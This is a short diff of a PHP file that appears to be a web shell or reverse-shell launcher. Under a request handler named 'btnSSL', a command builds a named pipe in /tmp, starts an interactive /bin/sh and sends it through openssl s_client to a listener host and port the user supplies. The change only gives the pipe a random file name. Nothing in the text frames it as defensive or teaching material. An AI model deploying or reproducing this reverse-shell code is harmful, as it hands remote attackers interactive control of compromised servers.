@@ -187,7 +187,9 @@
 	}
 
         if (isset($_REQUEST['btnSSL'])) {
-		$cmd = "mkfifo /tmp/.s; /bin/sh -i < /tmp/.s 2>&1 | openssl s_client -quiet -connect $lhost:$lport> /tmp/.s; rm /tmp/.s" ;
+		$randFile = rand(5, 100000);
+
+		$cmd = "mkfifo /tmp/.$randFile; /bin/sh -i < /tmp/.$randFile 2>&1 | openssl s_client -quiet -connect $lhost:$lport> /tmp/.$randFile; rm /tmp/.$randFile" ;
                 exec_cmd_and_exit($cmdType, $cmd);
         }
 
